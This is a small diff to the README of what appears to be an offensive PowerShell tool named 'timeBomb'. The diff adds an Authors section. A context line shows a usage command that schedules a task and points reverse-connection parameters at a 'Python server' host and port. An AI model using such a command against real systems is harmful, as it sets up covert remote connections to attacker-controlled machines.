@@ -76,4 +76,9 @@ The task is going to run and stop at specific time.
 PS> timeBomb -task trigger -at 15:00 -stoptime 16:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
+## Authors
+
+* TasoX (@taso_x)
+
+
 
